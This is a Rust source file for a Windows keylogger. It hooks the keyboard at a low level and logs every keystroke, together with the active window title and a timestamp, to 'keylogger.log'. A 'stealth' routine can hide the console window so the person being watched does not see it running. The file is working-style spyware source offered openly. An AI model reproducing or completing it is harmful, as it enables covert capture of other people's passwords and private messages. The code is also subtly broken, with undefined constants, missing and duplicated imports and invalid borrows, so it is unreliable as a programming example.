mod log;
mod structs;
use std::collections::HashMap;
#[allow(unused_imports)]
use std::fs::OpenOptions;
#[allow(unused_imports)]
use std::io::Write;
use std::mem;
use std::ptr;
use lazy_static::lazy_static;
#[allow(unused_imports)]
use std::time::{SystemTime, UNIX_EPOCH};
#[allow(unused_imports)]
use winapi::ctypes::c_int;
#[allow(unused_imports)]
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
#[allow(unused_imports)]
use winapi::shared::ntdef::LPCWSTR;
#[allow(unused_imports)]
use winapi::shared::windef::HHOOK;
use winapi::um::libloaderapi::GetModuleHandleW;
#[allow(unused_imports)]
use winapi::um::winuser::{
    CallNextHookEx, GetAsyncKeyState, GetForegroundWindow, GetMessageW, GetWindowTextW, GetAsyncKeyState, MapVirtualKeyA, GetKeyboardLayout, KBDLLHOOKSTRUCT, SetWindowsHookExW,
    WH_KEYBOARD_LL, WM_KEYDOWN,
};
use winapi::um::winuser::{MessageBoxW, PostQuitMessage};

lazy_static! {
    static ref KEY_NAME: HashMap<i32, &'static str> = {
        let mut map = HashMap::new();
        map.insert(0x08, "[BACKSPACE]");
        map.insert(0x0D, "\n");
        map.insert(0x20, "_");
        map.insert(0x09, "[TAB]");
        map.insert(0x10, "[SHIFT]");
        map.insert(0xA0, "[LSHIFT]");
        map.insert(0xA1, "[RSHIFT]");
        map.insert(0x11, "[CONTROL]");
        map.insert(0xA2, "[LCONTROL]");
        map.insert(0xA3, "[RCONTROL]");
        map.insert(0x12, "[ALT]");
        map.insert(0x5B, "[LWIN]");
        map.insert(0x5C, "[RWIN]");
        map.insert(0x1B, "[ESCAPE]");
        map.insert(0x23, "[END]");
        map.insert(0x24, "[HOME]");
        map.insert(0x25, "[LEFT]");
        map.insert(0x27, "[RIGHT]");
        map.insert(0x26, "[UP]");
        map.insert(0x28, "[DOWN]");
        map.insert(0x21, "[PG_UP]");
        map.insert(0x22, "[PG_DOWN]");
        map.insert(0xBE, ".");
        map.insert(0x6E, ".");
        map.insert(0xBB, "+");
        map.insert(0xBD, "-");
        map.insert(0x6B, "+");
        map.insert(0x6D, "-");
        map.insert(0x14, "[CAPSLOCK]");
        map
    };
}

type HookCallback = extern "system" fn(c_int, WPARAM, LPARAM) -> LRESULT;
type SetWindowsHookExWType = unsafe extern "system" fn(c_int, Option<HookCallback>, HHOOK, c_int) -> HHOOK;
type CallNextHookExType = unsafe extern "system" fn(HHOOK, c_int, WPARAM, LPARAM) -> LRESULT;
type MessageBoxWType = unsafe extern "system" fn(*mut std::ffi::c_void, LPCWSTR, LPCWSTR, u32) -> c_int;

static mut HOOK: HHOOK = ptr::null_mut();

fn save(key_stroke: i32, output_file: &mut std::fs::File) {
    let mut output = String::new();

    unsafe {
        let foreground = GetForegroundWindow();
        let thread_id = winapi::um::processthreadsapi::GetWindowThreadProcessId(foreground, ptr::null_mut());
        let layout = winapi::um::winuser::GetKeyboardLayout(thread_id);

        let mut window_title: [u16; 256] = [0; 256];
        winapi::um::winuser::GetWindowTextW(foreground, window_title.as_mut_ptr(), 256);

        let window_title = String::from_utf16_lossy(&window_title);
        let last_window: &'static mut String = &mut String::new();
        if window_title != *last_window {
            last_window.clear();
            last_window.push_str(&window_title);

            let t = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("Failed to get system time")
                .as_secs();
            let s = time::strftime("%c", &time::at(time::Timespec::new(t as i64, 0)))
                .expect("Failed to format time");
            output.push_str(&format!("\n\n[Window: {} - at {}] ", window_title, s));
        }
    }

    let key_str = match FORMAT {
        10 => format!("[{}]", key_stroke),
        16 => format!("[{:X}]", key_stroke),
        _ => {
            unsafe {
                if let Some(key_name) = KEY_NAME.get(&key_stroke) {
                    key_name.to_string()
                } else {
                    let key: char = mem::transmute::<u8, char>(winapi::um::winuser::MapVirtualKeyA(
                        key_stroke as u32,
                        winapi::um::winuser::MAPVK_VK_TO_CHAR,
                    ));
                    let lowercase = (GetAsyncKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) == 0;
                    let shift_key = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000) != 0;
                    let lowercase = lowercase != shift_key;
                    let key = if lowercase { key.to_ascii_lowercase() } else { key };
                    key.to_string()
                }
            }
        }
    };

    output.push_str(&key_str);

    if let Err(err) = writeln!(output_file, "{}", output) {
        eprintln!("Failed to write to file: {}", err);
    }
    output_file.flush().expect("Failed to flush file");
    println!("{}", output);
}

unsafe extern "system" fn hook_callback(n_code: c_int, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 && w_param == WM_KEYDOWN {
        let kbd_struct: *const KBDLLHOOKSTRUCT = l_param as *const KBDLLHOOKSTRUCT;
        let vk_code = (*kbd_struct).vkCode;
        save(vk_code, &mut OUTPUT_FILE);
    }

    winapi::um::winuser::CallNextHookEx(HOOK, n_code, w_param, l_param)
}

unsafe fn set_hook() {
    let module_handle = GetModuleHandleW(ptr::null_mut());
    let set_windows_hook_ex_w: SetWindowsHookExWType = mem::transmute(winapi::um::libloaderapi::GetProcAddress(
        module_handle,
        "SetWindowsHookExW\0".as_ptr() as *const i8,
    ));
    HOOK = set_windows_hook_ex_w(WH_KEYBOARD_LL, Some(hook_callback), ptr::null_mut(), 0);
    if HOOK.is_null() {
        let a: LPCWSTR = "Failed to install hook!\0".encode_utf16().collect::<Vec<u16>>().as_ptr();
        let b: LPCWSTR = "Error\0".encode_utf16().collect::<Vec<u16>>().as_ptr();
        let message_box_w: MessageBoxWType = mem::transmute(winapi::um::libloaderapi::GetProcAddress(
            module_handle,
            "MessageBoxW\0".as_ptr() as *const i8,
        ));
        message_box_w(ptr::null_mut(), a, b, 0x10);
    }
}

fn release_hook() {
    unsafe {
        winapi::um::winuser::UnhookWindowsHookEx(HOOK);
    }
}

fn stealth() {
    #[cfg(feature = "visible")]
    unsafe {
        winapi::um::winuser::ShowWindow(
            winapi::um::winuser::FindWindowA("ConsoleWindowClass\0".as_ptr() as *const i8, ptr::null_mut()),
            1,
        );
    }

    #[cfg(feature = "invisible")]
    unsafe {
        winapi::um::winuser::ShowWindow(
            winapi::um::winuser::FindWindowA("ConsoleWindowClass\0".as_ptr() as *const i8, ptr::null_mut()),
            0,
        );
    }
}

lazy_static::lazy_static! {
    static ref OUTPUT_FILE: std::fs::File = {
        let output_filename = "keylogger.log";
        println!("Logging output to {}", output_filename);
        OpenOptions::new()
            .append(true)
            .create(true)
            .open(output_filename)
            .expect("Failed to open output file")
    };
}

fn main() {
    stealth();
    unsafe { set_hook() };

    let mut msg: winapi::shared::windef::MSG = Default::default();
    while unsafe { GetMessageW(&mut msg, ptr::null_mut(), 0, 0) } != 0 {
        unsafe {
            TranslateMessage(&mut msg);
            DispatchMessageW(&mut msg);
        }
    }

    release_hook();
}
